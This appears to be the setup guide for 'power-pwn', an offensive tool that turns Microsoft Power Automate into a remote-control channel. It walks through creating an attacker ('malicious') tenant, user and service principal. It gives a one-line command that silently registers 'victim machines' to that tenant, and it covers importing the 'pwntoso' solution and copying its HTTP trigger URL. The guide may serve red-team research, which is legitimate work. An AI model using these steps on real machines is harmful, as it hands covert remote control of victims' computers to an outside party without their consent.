# How to set up your power-pwn cloud account

### Set up a malicious Microsoft tenant

1. Set up your free Microsoft tenant by following [Microsoft guidelines](https://docs.microsoft.com/en-us/azure/active-directory/verifiable-credentials/how-to-create-a-free-developer-account)
   
   ![Pwntoso tenant](assets/pwntoso.png)

2. Create a malicious user account and assign it a _Power platform administrator_ role. The admin role isn't necessary, it's just convenient.

   ![Power platform administrator role](assets/power_platform_admin.png)

3. On a private browser tab

   1. Go to https://flow.microsoft.com and log in with the malicious user. Follow through the sign-in process to initiate a Power Automate trial license. 

   2. Follow the same process with https://make.powerapps.com to initiate a Power Apps trial license.

4. Create a Service Principal by following [Microsoft guidelines](https://docs.microsoft.com/en-us/power-automate/desktop-flows/machines-silent-registration#using-a-service-principal-account) and note the _tenantId_, _applicationId_ and _secret_. 

### Infect a test machine victim machines

1. To register a victim machine, run the following command

   `echo <secret> | C:\Program Files (x86)\Power Automate Desktop\PAD.MachineRegistration.Silent.exe -register -applicationid <applicationId> -tenantid <tenantId> -clientsecret -force`

2. That's it! For troubleshooting, refer to [Microsoft Docs](https://docs.microsoft.com/en-us/power-automate/desktop-flows/machines-silent-registration#silently-register-a-new-machine).

### Upload pwntoso to your Power Automate cloud environment

1. Log into https://flow.microsoft.com with the malicious user.

2. Go to _Solutions_ and click _Import solution_

   ![Import pwntoso solution](assets/import_solution.png)

3. Zip the content of [pwntoso_1_0_0_1](https://github.com/mbrg/power-pwn/tree/main/solution/pwntoso_1_0_0_1) and select it when asked to provide a solution file. Follow the guided process to completion.

4. Go to _My flows_ and search for _Endpoint_

   ![Endpoint flow](assets/endpoint_flow.png)

   Click on _Edit_ and then on _When a HTTP request is received_ and copy the URL under _HTTP POST URL_

   ![HTTP Post URL](assets/post_url.png)
